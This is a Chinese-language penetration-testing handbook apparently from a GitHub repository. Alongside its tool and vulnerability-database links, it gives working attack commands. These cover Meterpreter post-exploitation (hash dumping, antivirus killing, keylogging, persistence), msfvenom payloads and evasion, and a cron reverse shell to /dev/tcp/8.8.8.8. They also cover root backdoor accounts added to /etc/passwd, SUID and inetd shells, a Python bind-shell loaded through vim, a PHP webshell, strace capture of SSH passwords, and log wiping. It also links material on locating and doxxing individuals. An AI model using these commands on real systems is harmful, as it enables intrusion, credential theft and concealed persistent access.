# Power-PenTest🕶

`渗透手册`

<p align="center">
    <img src="../../img/pentest.jpg">
</p>

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

# 0教程资源
## 靶机
### [DVWA](https://github.com/ethicalhack3r/DVWA)
**通关笔记**
- DVWA小记 [md](./实验/DVWA小记.md)

### [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)
**通关笔记**
- pikachu小记 [md](./实验/pikachu小记.md)

---

## 思维简图
- [phith0n/Mind-Map: 各种安全相关思维导图整理收集](https://github.com/phith0n/Mind-Map)
- [SecWiki/sec-chart: 安全思维导图集合](https://github.com/SecWiki/sec-chart)

---

## 漏洞库
- [Exploits Database by Offensive Security](https://www.exploit-db.com/)
- [全球最新漏洞库 - 安全客，安全资讯平台](https://www.anquanke.com/vul?page=1)
- [CVE - Common Vulnerabilities and Exposures (CVE)](https://cve.mitre.org/index.html)
- [CVE中文漏洞信息库 - SCAP中文社区](http://cve.scap.org.cn/)
- [CVSS v3.0 Specification Document](https://www.first.org/cvss/specification-document)
- [CWE - Common Weakness Enumeration](http://cwe.mitre.org/index.html)
- [CXSECURITY.COM Free Security List](https://cxsecurity.com/)
- [ICS-CERT Advisories | ICS-CERT](https://ics-cert.us-cert.gov/advisories)
- [NSFOCUS绿盟科技](http://www.nsfocus.net/index.php)
- [NVD - Home](https://nvd.nist.gov/)
- [漏洞时代 - 最新漏洞_0DaY5.CoM - 0DaY5.CoM](http://0day5.com/)
- [SecuriTeam.com - A Free Accurate and Independent Source of Vulnerability Information](http://www.securiteam.com/)
- [VULNERABILITY LAB - SECURITY VULNERABILITY RESEARCH LABORATORY - Best Bug Bounty Programs, Vulnerability Coordination and Bug Bounty Platform - INDEX](https://www.vulnerability-lab.com/)
- [国家信息安全漏洞库](http://www.cnnvd.org.cn/)
- [知道创宇 Seebug 漏洞平台 - 洞悉漏洞，让你掌握第一手漏洞情报！](https://www.seebug.org/)
- [💀 Sploitus | Exploit & Hacktool Search Engine](https://sploitus.com/)
- [SecurityFocus](https://www.securityfocus.com/)
- [CVE security vulnerability database. Security vulnerabilities, exploits, references and more](https://www.cvedetails.com/)
- [Shodan Exploits](https://exploits.shodan.io/welcome)
- [0day.today 1337day Inj3ct0r 漏洞数据库](https://cn.0day.today/)
- [exp库-打造中文最大exploit库](http://www.expku.com/)

---

# 0瑞士军刀/安全工具/框架
## cobaltstrike

**使用**
- 服务端

    `./teamserver 你的IP 你的密码`

- 客户端

    `java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

    或

    `javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

**文章**
- [cobalt strike 快速上手 [ 一 ] - FreeBuf专栏·攻防之路](https://www.freebuf.com/column/149236.html)
- [教你修改cobalt strike的50050端口 - 3HACK](https://www.3hack.com/note/96.html)
- [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)

**爆破 cobaltstrike teamserver**
```bash
git clone https://github.com/ryanohoro/csbruter
cd csbruter
cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
```

---

## [Empire](https://github.com/EmpireProject/Empire)

**文章/相关**
- [【技术分享】一篇文章精通PowerShell Empire 2.3(上)](https://www.anquanke.com/post/id/87328)
- [【技术分享】一篇文章精通PowerShell Empire 2.3(下)](https://www.anquanke.com/post/id/87333)

**图形化UI**
- [leeberg/BlueCommand](https://github.com/leeberg/BlueCommand)

---

## metasploit

**文章/相关**
- [MSF基础命令新手指南](https://www.jianshu.com/p/77ffbfc3a06c)
- [【渗透神器系列】Metasploit](https://thief.one/2017/08/01/1/)
- [给kali的Metasploit下添加一个新的exploit](https://blog.csdn.net/SilverMagic/article/details/40978081)
- [linux - Metasploit: Module database cache not built yet, using slow search](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Nightly Installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)


**Module database cache not built yet, using slow search**
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

**图形化UI**
- [WayzDev/Kage](https://github.com/WayzDev/Kage)

### meterpreter

**文章**
- [linux - Metasploit: Module database cache not built yet, using slow search - Server Fault](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Metasploit入门用法(主动攻击) - CSDN博客](https://blog.csdn.net/wsh19930305/article/details/72855660)
- [meterpreter必知必会的15个命令](https://www.4hou.com/tools/14185.html)
- [萌新科普 手把手教你如何用MSF进行后渗透测试](https://www.anquanke.com/post/id/164525)

**快速上手**
```bash
shell   # 获取目标主机的 cmd shell
getsystem # 命令可以提权到本地系统权限
sysinfo # 显示系统名,操作系统,架构和语言等。
```

- 获取会话

    **handler**
    ```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter_reverse_tcp
    set LHOST
    set LPORT
    exploit -j  # 后台执行
    ```

    **cmdshell 升级为 meterpreter**

    如果最开始获取的是 cmdshell,后来发现这台机器非常适合作为测试其它终端的跳板,这个时候 cmdshell 的功能已经不能满足需要,升级成 meterpreter 就十分有必要。`sessions -u "id"` 将该 cmdshell 升级成 meterpreter

- 提权

    **绕过 UAC**

    通常 webshell 的权限都比较低,能够执行的操作有限,没法查看重要文件、修改系统信息、抓取管理员密码和 hash、安装特殊程序等,所以我们需要获取系统更高的权限

    ```bash
    use exploit/windows/local/bypassuac # 一系列都可用
    use exploit/windows/local/bypassuac_eventvwr
    sessions    # 查看目前的session
    sessions -k # 杀死所有session
    set session    # 设为你需要exploit的session
    ```

    **利用系统漏洞提权**

    ```bash
    use exploit/windows/local/ms13_081_track_popup_menu # 以ms13-081为例
    set session
    ```

- 进程迁移

    当meterpreter单独作为一个进程运行时容易被发现,如果将它和系统经常运行的进程进行绑定,就能够实现持久化。
    ```bash
    getpid  # 查看当前会话的进程id
    ps  # 查看目标运行的进程
    migrate pid # 绑定进程
    ```

- 令牌假冒

    在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie。

    msf提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色。
    ```bash
    getuid  # 查看当前用户
    use incognito   # 进入该模块
    list_tokens -u  # 查看存在的令牌
    impersonate_token 用户名  # 令牌假冒
    # 注意用户名的斜杠需要写两个。

    getuid  # 查看是否切换成功
    ```

- 获取凭证
    ```bash
    run hashdump

    load mimikatz   # 加载mimikatz模块
    wdigest
    kerberos
    ```

- 操作文件系统

    **基本操作**
    ```bash
    ls：列出当前路径下的所有文件和文件夹。
    pwd 或 getwd：查看当前路径
    search：搜索文件,使用search -h查看帮助。
    cat：查看文件内容,比如cat test.txt。
    edit：编辑或者创建文件。和Linux系统的vm命令类似,同样适用于目标系统是windows的情况。
    rm：删除文件。
    cd：切换路径。
    mkdir：创建文件夹。
    rmdir：删除文件夹。
    getlwd 或 lpwd：查看自己系统的当前路径。
    lcd：切换自己当前系统的目录。
    lls：显示自己当前系统的所有文件和文件夹。
    ```

    **上传和下载**
    ```bash
    upload <file> <destination> # 上传文件到 Windows 主机
    # 注意：使用 -r 参数可以递归上传上传目录和文件

    download <file> <path to save>  # 从 windows 主机下载文件
    # 注意：Windows 路径要使用双斜线
    # 如果我们需要递归下载整个目录包括子目录和文件,我们可以使用 download -r命令
    ```

- 其它操作

    **关闭防病毒软件**
    ```bash
    run killav
    run post/windows/manage/killav
    ```

    **操作远程桌面**
    ```bash
    run post/windows/manage/enable_rdp # 开启远程桌面
    run post/windows/manage/enable_rdp username=test password=test # 添加远程桌面的用户(同时也会将该用户添加到管理员组)
    ```

    **截屏**

    `screenshot`

    **键盘记录**
    ```bash
    keyscan_start：开启键盘记录功能
    keyscan_dump：显示捕捉到的键盘记录信息
    keyscan_stop：停止键盘记录功能
    ```

    **执行程序**
    ```bash
    execute -f <path> [options] 在目标主机上执行 exe 文件
    -H：创建一个隐藏进程
    -a：传递给命令的参数
    -i：跟进程进行交互
    -m：从内存中执行
    -t：使用当前伪造的线程令牌运行进程
    -s：在给定会话中执行进程
    ```

- 端口转发和内网代理

    **portfwd**

    portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令的参数。
    ```bash
    portfwd add -l 2222 -r 1.1.1.1 -p 3389 # 将1.1.1.3的3389端口转发到本地的2222端口。
    -l：本地监听端口
    -r：内网目标的ip
    -p：内网目标的端口
    ```

    **pivot**

    pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测。
    ```bash
    route add 内网ip 子网掩码 session的id # 添加一个路由
    route print

    如果其它程序需要访问这个内网环境,就可以建立socks代理
    msf提供了3个模块用来做socks代理。
    auxiliary/server/socks4a
    auxiliary/server/socks5
    auxiliary/server/socks_unc

    use auxiliary/server/socks4a
    SRVHOST：监听的ip地址,默认为0.0.0.0,一般不需要更改。
    SRVPORT：监听的端口,默认为1080。
    直接运行run命令,就可以成功创建一个socks4代理隧道,在linux上可以配置proxychains使用,在windows可以配置Proxifier进行使用。
    ```

- 后门

    Meterpreter的shell运行在内存中,目标重启就会失效,如果管理员给系统打上补丁,那么就没办法再次使用exploit获取权限,所以需要持久的后门对目标进行控制

    **metsvc**
    ```bash
    run metsvc
    # 命令运行成功后会在 C:WindowsTEMP 目录下新建随机名称的文件夹,里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)
    # 同时会新建一个服务,显示名称为Meterpreter,服务名称为metsvc,启动类型为"自动",绑定在31337端口。

    use exploit/multi/handler
    set payload windows/metsvc_bind_tcp
    set rhost xxx.xxx.xxx.xxx
    set lport 31337
    ```

    **persistence**
    ```bash
    run persistence -X -i 10 -r 192.168.1.9 -p 4444
    -A：安装后门后,自动启动exploit/multi/handler模块连接后门
    -L：自启动脚本的路径,默认为%TEMP%
    -P：需要使用的payload,默认为windows/meterpreter/reverse_tcp
    -S：作为一个服务在系统启动时运行(需要SYSTEM权限)
    -T：要使用的备用可执行模板
    -U：用户登陆时运行
    -X：系统启动时运行
    -i：后门每隔多少秒尝试连接服务端
    -p：服务端监听的端口
    -r：服务端ip
    ```

---

## 抓包改包
### [Burp Suite](https://portswigger.net/)

**用法总结**
- burp小记 [md](./工具/burp小记.md)

**书**
- [Burp Suite 实战指南](https://t0data.gitbooks.io/burpsuite/content/)

**技巧**

`Firefox about:config` 里 `network.captive-portal-service.enabled` 设置成 `false` ,可以关闭火狐向 `http://detectportal.firefox.com/` 发包

**插件**

> 使用堆栈跟踪进行Java指纹识别
- [x41sec/BeanStack](https://github.com/x41sec/beanstack)

### [wireshark](https://www.wireshark.org/)

**样本**
- [SpiderLabs/IOCs-IDPS](https://github.com/SpiderLabs/IOCs-IDPS)

**过滤语法**

```bash
http.request.method == "POST"   # POST请求
tcp contains "http" # 显示payload中包括"http"字符串的tcp封包。
http.request.uri contains "online" # 显示请求的uri包括"online"的http封包。
ip.addr == 1.1.1.1 # IP为1.1.1.1的流量
```

---

## exp/poc/tool合集

- [Kali Linux Tools Listing | Penetration Testing Tools](https://tools.kali.org/tools-listing)
- [信息安全工具汇总 - WLGF,网络攻防小组](http://www.nsoad.com/Security-tools/20180730/tools-1217.html)
- [rootphantomer/exp: 收集各种各样的exp](https://github.com/rootphantomer/exp)
- [Jack-Liang/kalitools: Kali Linux工具清单](https://github.com/Jack-Liang/kalitools)
- [k8gege/K8tools: K8工具合集](https://github.com/k8gege/K8tools)
- [WangYihang/Exploit-Framework](https://github.com/WangYihang/Exploit-Framework)
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [csirt/CVEsPoCs](https://github.com/Spacial/csirt/blob/master/CVEsPoCs.md)
- [wudimahua/Firewall](https://github.com/wudimahua/Firewall)
- [nanshihui/PocCollect](https://github.com/nanshihui/PocCollect)
- [hanc00l/some_pocsuite](https://github.com/hanc00l/some_pocsuite)
- [foospidy/web-cve-tests](https://github.com/foospidy/web-cve-tests)
- [cckuailong/PocCollect](https://github.com/cckuailong/PocCollect)
- [ptresearch/AttackDetection](https://github.com/ptresearch/AttackDetection)
- [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)

---

# 2Misc
## APT

**文章**
- [APT攻击:模拟一次网络战过程](https://www.anquanke.com/post/id/103265)
- [毒云藤（APT-C-01）军政情报刺探者揭露](http://www.freebuf.com/articles/system/185155.html)
- [APT10又曝光了,这次是因为?](https://www.secpulse.com/archives/75623.html)
- [疑似朝鲜APT组织发起针对学术界目标的钓鱼攻击](https://www.anquanke.com/post/id/167566)
- [一场精心策划的针对驱动人生公司的定向攻击活动分析](https://www.freebuf.com/articles/system/192194.html)
- [海莲花组织向招聘单位发出应聘请求，并附上简历链接](https://www.freebuf.com/column/194135.html)
- [“毒针”行动 - 针对“俄罗斯总统办所属医疗机构”发起的0day攻击](http://blogs.360.cn/post/PoisonNeedles_CVE-2018-15982.html)
- [被遗漏的0day ? —APT-C-06组织另一网络武器库分析揭秘](http://blogs.360.cn/post/VBScript_vul_CH.html)

**资源**
- [kbandla/APTnotes](https://github.com/kbandla/APTnotes)
- [APTnotes](https://gitee.com/superme/APTnotes)
- [CyberMonitor/APT_CyberCriminal_Campagin_Collections](https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections)
- [blackorbird/APT_REPORT](https://github.com/blackorbird/APT_REPORT)
- [Intrusion Truth – We hunt APTs](https://intrusiontruth.wordpress.com/)
- [Groups - MITRE ATT&CK™](https://attack.mitre.org/groups/)
- [Technique Matrix - Enterprise ATT&CK™](https://attack.mitre.org/matrices/enterprise/)


### 社工
**案例**
- [一个精壮的代购骗子被我彻底征服](https://bbs.ichunqiu.com/thread-37565-1-3.html)
- [看我如何破解xiaoba勒索病毒最新版并社工](https://bbs.ichunqiu.com/thread-29598-1-1.html)
- [【忍无可忍】揭秘一个专门针对学生家长下手的诈骗团伙](https://bbs.ichunqiu.com/thread-46370-1-1.html)
- [一个xss漏洞到内网漫游](https://bbs.ichunqiu.com/thread-46068-1-1.html)
- [从社工考试答案到发现惊天作弊团伙](https://bbs.ichunqiu.com/thread-43205-1-1.html)
- [卧薪尝胆~揭秘新型刷票骗局，击溃骗子的心肝脾肺肾！](https://bbs.ichunqiu.com/thread-43341-1-1.html)
- [对某黑产大佬的一次扒皮](https://bbs.ichunqiu.com/thread-42939-1-1.html)
- [记一次对色情网站拥有人身份的挖掘](https://nosec.org/home/detail/1869.html)
- [这回不定位女友了：火车票上的星号暗藏玄机？！](http://www.freebuf.com/articles/database/143402.html)
- [常见社工方法以及如何防社工](https://bbs.ichunqiu.com/thread-29654-1-21.html)
- [从群体电脑蓝屏到反黑幕后黑手](https://aq.mk/index.php/archives/8/)
- [杨猛 | 世界上最好的在线游戏：追踪杀手，也调查冲突和毒枭](https://mp.weixin.qq.com/s/L_0vAnJtlfL_8rNIIPPAOQ)
- [我被人吞了一部手机，调查后发现对方是淘宝打假人](https://www.secpulse.com/archives/96599.html)
- [“答应我，别做违法事”——我是如何劝色情网站操控者从良的](https://www.secpulse.com/archives/97015.html)
- [QQ申诉那点事](http://www.mottoin.com/detail/2943.html)
- [朋友圈别瞎发照片，指不定跟踪狂就是这样找到你家的](https://www.secpulse.com/archives/98492.html)

**工具集**
- **SET** [使用记录](./工具/SET小记.md)

**Email**
- **文章**
    - [关于电子邮件诈骗的一些分析](http://www.4hou.com/web/13931.html)

- **工具**
    - [nettitude/Prowl](https://github.com/nettitude/Prowl)

**钓鱼**
- **案例**
    - [指尖博弈——FBI竟建立虚假联邦快递网站](https://www.anquanke.com/post/id/166650)
    - [Cookie Maker：隐藏在Google Docs中的恶意网络](https://www.anquanke.com/post/id/165033)
    - [利用QQ钓鱼或者定位女友是否回家](http://www.freebuf.com/articles/web/140111.html)
    - [QQ定位女友是否回家系列二之定位系统的打造](http://www.freebuf.com/news/141038.html)
    - [利用斯拉夫字母辅助社会工程学攻击思路](https://bbs.ichunqiu.com/thread-46462-1-2.html)

- **工具**
    - [HTTrack - 克隆任意网站](http://topspeedsnail.com/httrack-clone-website/)
    - [Seeker：一款可获取高精度地理和设备信息的工具分析](http://www.freebuf.com/sectool/179641.html)

- **rlo**
    - [RLO文件名欺骗](https://blog.csdn.net/mgxcool/article/details/50637346)
    - [木马逆名欺骗：利用unicode控制符RLO](https://blog.csdn.net/kencaber/article/details/50649606)

- **URL欺骗**
    - [Phishing with Unicode Domains](https://www.xudongz.com/blog/2017/idn-phishing/)

**定位**
- **案例**
```
http://www.freebuf.com/articles/database/185954.html
https://bbs.ichunqiu.com/thread-23489-1-26.html
http://www.freebuf.com/articles/web/137952.html
https://mp.weixin.qq.com/s/K-zFVBaSw6yThuoLdUTjdg
https://www.washingtonpost.com/business/technology/for-sale-systems-that-can-secretly-track-where-cellphone-users-go-around-the-globe/2014/08/24/f0700e8a-f003-11e3-bf76-447a5df6411f_story.html
```

- **GPS定位**
```
http://mygeoposition.com/
https://ip.rtbasia.com/
http://api.map.baidu.com/lbsapi/getpoint/index.html
http://www.gpsspg.com/maps.htm
http://www.opengps.cn/
http://www.gzhatu.com/jingweidu.html
http://www.gzhatu.com/dingwei.html
http://www.gzhatu.com/du2dfm.html
http://map.yanue.net/
```

- **基站定位**
```
http://www.gpsspg.com/bs.htm
http://www.cellid.cn/
http://www.haoservice.com/freeLocation/
http://www.minigps.net/cellsearch.html
```

- **手机号码归属地**
```
http://www.ip138.com:8080/search.asp
http://shouji.ip38.com/
http://www.gpsspg.com/phone/
```

- **ip查询**
```
https://asnip.net/
http://plotip.com/ip
https://db-ip.com/
https://www.ipip.net/
http://www.ip138.com/
http://www.123cha.com/
http://www.hao7188.com/
http://www.myip.cn/
https://www.ripe.net/
http://ipwhois.cnnic.net.cn/
http://ipblock.chacuo.net/
http://www.ipplus360.com/
https://www.opengps.cn/Data/IP/LocHighAcc.aspx
http://www.gpsspg.com/ip/
http://ip38.com/
https://haoip.cn/
http://www.wxip.me/
http://ip.lockview.cn/Default.aspx
http://ip.womenzhidao.com/
https://github.com/DeerCloud/IPList
```

---

## 各种爆破
### 服务-端口爆破
**工具**
- [galkan/crowbar](https://github.com/galkan/crowbar) - 支持对于OpenVPN、RDP、SSH、VNC的爆破，非常优秀的工具

---

## 事件响应
### 操作系统取证

**手机**

鸽

**win**
- 抓key
    - [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 抓密码神器
    - [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用WMI 提取WinSCP、PuTTY、SuperPuTTY、FileZilla和Microsoft remote Desktop等远程访问工具保存的会话信息的ps脚本

### 内存取证
鸽

### 文件取证

**exif**
- [ExifTool](https://www.sno.phy.queensu.ca/~phil/exiftool/)

**浏览器取证**
- [obsidianforensics/hindsight](https://github.com/obsidianforensics/hindsight) - 历史访问记录取证工具(真是不给人留条活路)

### 应急处置

- [meirwah/awesome-incident-response](https://github.com/meirwah/awesome-incident-response)
- [NextronSystems/APTSimulator](https://github.com/NextronSystems/APTSimulator) - 伪装成APT受害者？(还有这种操作)

---

## 运维保障
### 基线

**资源**
- [CIS Benchmarks](https://learn.cisecurity.org/benchmarks)
    安全配置建议，内容很多，虽然是英文版本

**工具**
- [lis912/CapOS](https://github.com/lis912/CapOS)
    等级保护测评windows基线检查

**文章**
- [经验分享 | 企业如何做好安全基线配置](https://www.freebuf.com/articles/es/158781.html)

---

### 应用安全

**查暗链**
1. 搜索引擎:`黑产关键字+site:"网站域名"`
2. 用类似xenu(尽量在虚拟机下运行)的工具批量爬取网站外链查看有无关键字

**查后门**
1. [D盾](http://www.d99net.net/)
2. [深信服Web后门扫描](http://edr.sangfor.com.cn/backdoor_detection.html)
3. [河马webshell查杀](http://www.shellpub.com/)
4. [铱迅Webshell扫描器](http://www.yxlink.com/technology.php)
5. [网站安全狗网马查杀](download.safedog.cn/download/software/safedogwzApache.exe)
6. [OpenRASP WEBDIR+检测引擎](https://scanner.baidu.com)

---

# 6RedTeam
## 权限维持/反侦察
### 通用

**msfvenom**

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe`

**Veil**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh –c
sudo ./Veil.py
```

**HERCULES**
```bash
确保电脑里有Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

**ASWCrypter**
**VENOM**
**Metasploit**
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost
set lport
run
```

---

### web
#### 后门

鸽

---

### win
#### 后门

```bash
net user PHPNET$ 1234abcd~ /add # 添加用户
# Windows 的帐号名称后带着"$"符号时,不会在 net user 命令中显示出帐号信息
net localgroup administrators PHPNET$ /add # 将用户添加到管理组
net user PHPNET$ /del # 删除用户

query user # 查看会话

logoff ID号 # 踢掉
```

#### 痕迹清理

**删除日志文件**
```bash
net stop eventlog   # 停止服务
del c:\Windows\System32\Winevt\Logs\* /Q
```

### linux
#### 后门

**添加root权限后门用户**

我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。

密码加密使用下面的命令`perl -e 'print crypt("password", "AA"). "\n"'`

所以我们最终想要在passwd文件中的条目是这个样子的`backdoor:AA6tQYSfGxd/A/A:0:0:me:/root:/bin/bash`

执行写入`echo "backdoor:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash">>/etc/passwd`

**Crond开机自启后门**

先创建 /etc/xxxx 脚本文件(名字自己改)，利用该脚本进行反弹。以下脚本代表全自动反弹到 8.8.8.8 的 53 端口。
```vim
vim /etc/xxxx
    #!/bin/bash
    if netstat -ano|grep -v grep | grep "8.8.8.8">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    bash -i >& /dev/tcp/8.8.8.8/53 0>&1
    fi

chmod +sx /etc/xxxx
```
```vim
vim /etc/crontab
    */1 * * * * root /etc/xxxx

service cron reload #不同发行版重启方式不一样
service cron start
```

然后在 8.8.8.8 的服务器上使用 NC 接收 Shell 即可。

`nc -vv -lp 53`

**SUID shell**

首先, 先切换成为root用户，并执行以下的命令:
```bash
dawg:~# cp /bin/bash /.woot
dawg:~# chmod 4755 /.woot
dawg:~# ls -al /.woot
-rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
```
当然, 你也可以起其他更具备隐藏性的名字,我想猥琐并机智的你，肯定能想出很多好的名字的。
文件前面的那一点也不是必要的，只是为了隐藏文件( 在文件名的最前面加上“.”，就可以在任意文件目录下进行隐藏) .
```bash
#现在，做为一个普通用户，我们来启用这个后门:
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw)
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b$
#为什么不行呢? 因为 bash2 针对 suid有一些护卫的措施. 但这也不是不可破的:
```
```bash
/.woot -p
id
    uid=1000(fw) gid=1000(fw) euid=0(root) groups=1000(fw)
#使用-p参数来获取一个root shell. 这个euid的意思是 effective user id
#这里要特别注意的是，作为一个普通用户执行这个SUID shell时，一定要使用全路径。
```
如何查找那些具有SUID 的文件: `dawg:~# find / -perm +4000 -ls` 这时就会返回具有SUID位的文件啦。

**远程后门**

```vim
vim /etc/inetd.conf
    #discard stream tcp nowait root internal
    #discard dgram udp wait root internal
    daytime stream tcp nowait root /bin/bash bash -i

inetd
然后就可以用nc来爆菊
```
可以修改/etc/services文件，加入以下的东西
```vim
vim /etc/services
    woot 6666/tcp #evil backdoor service
vim /etc/inetd.conf
    woot stream tcp nowait root /bin/bash bash -i
```

**PAM后门**

主要思路:pam_unix_auth.c打补丁安装到正常的PAM模块中。
1、获取目标系统所使用的PAM版本：
`rpm -qa |grep pam`
2、编译安装PAM
3、将本地pam_unix_auth.c文件通过打补丁方式，编译生成。
4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，后门密码为root123,并会在/tmp/pslog记录root登录密码。

**vim后门**

此方法适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如python版本的正向后门监听11端口。

检测有无扩展
```bash
vim --version | grep python
```

enter the mal script directory 、execute the script and then remove the script
`cd /usr/lib/python2.7/site-packages`

```python
vim dir.py
#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',11))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)
```
`$(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py`

read more [[DARK] Weapons of Text Destruction](https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf)

**终端解析\r导致的问题**
```bash
echo -e "<?=\`\$_POST[good]\`?>\r<?='PHP Test Page >||<                  ';?>" >/var/www/html/test.php
```

**strace记录ssh登录密码**

注意bash_profile是在登录的shell执行的，bashrc是在非登录的shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中。
```bash
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh'
# 也可记录 su密码
alias su='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 su'

grep "read(3" /tmp/sshpwd-名字自己补全  | tail -n 11
```

**预加载型动态链接库后门 ld.so.preload**

在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack
strace 命令id的时候可以发现有预先去读取/etc/ld.so.preload文件(也可使用设置LD_PRELAOD环境变量方式)，如果我们将事先写好的恶意so文件位置写入ld.so.preload文件，这个时候就会达到“劫持”的效果。
比较好用的工具有Vegile和cub3等
[cub3](https://github.com/mempodippy/cub3),这个工具使用了LD_PRELOAD和系统的扩展属性去隐藏文件。
其中还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件/etc/ld.so.preload路径的rootkit，此方法更加隐蔽，这个方法的较成熟的利用工具是Vlany，github地址https://github.com/mempodippy/vlany

**Vegile**

This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell
```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
鸽
```

**进程注入**

使用ptrace向进程中注入恶意so文件工具[linux-inject](https://github.com/gaffe23/linux-inject/)

**内核级rootkit**

如mafix、[Diamorphine](https://github.com/m0nad/Diamorphine)

**Reference**
- [linux常见backdoor及排查技术](https://xz.aliyun.com/t/4090)
- [Linux后门整理合集](https://www.secpulse.com/archives/59674.html)

#### 隐藏进程

**藏文件和文件夹**
1. 比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。(查看方法：ls -a)

    ```
    touch .webshell.php    创建名字为 .webshell.php 的文件
    mkdir .backdoor/       创建名字为 .backdoor 的文件夹
    ```

2. 除非在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。如果是文件的话浏览器访问直接输 ... 就行，目录同理。

    ```
    touch ...       创建名字为 ... 的文件
    mkdir ...       创建名字为 ... 的文件夹
    ```

**Linux/Unix 修改文件时间戳**

直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。
`touch -t 1401021042.30 webshell.php`

---


## 信息收集
### 漏洞
#### web漏扫

**[AWVS-acunetix](https://www.acunetix.com/vulnerability-scanner/)**
- 文章
    - [编写AWVS脚本探测web services](http://gv7.me/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/)

- 解密脚本
    - [fnmsd/awvs_script_decode](https://github.com/fnmsd/awvs_script_decode)

**[chaitin/xray](https://github.com/chaitin/xray) - 长亭的洞鉴漏扫**

#### 综合漏扫

**[Nessus](https://www.tenable.com/downloads/nessus)**
- 报告翻译
    - [FunnyKun/NessusReportInChinese](https://github.com/FunnyKun/NessusReportInChinese)
    - [Bypass007/Nessus_to_report](https://github.com/Bypass007/Nessus_to_report)

**[ysrc/xunfeng](https://github.com/ysrc/xunfeng)**

---

### 搜索引擎 Hacking

**github**
- 例子
    ```bash
    create user identified by
    create user zabbix@'%' identified by
    ```

**google**
- 例子
    ```bash
    inurl:tw
    inurl:jp

    inurl:editor/db/
    inurl:eWebEditor/db/
    inurl:bbs/data/
    inurl:databackup/
    inurl:blog/data/
    inurl:\boke\data
    inurl:bbs/database/
    inurl:conn.asp
    inc/conn.asp
    Server.mapPath(".mdb")
    allinurl:bbs data
    filetype:mdb inurl:database
    filetype:inc conn
    inurl:data filetype:mdb
    intitle:"index of" data

    intitle:"index of" etc
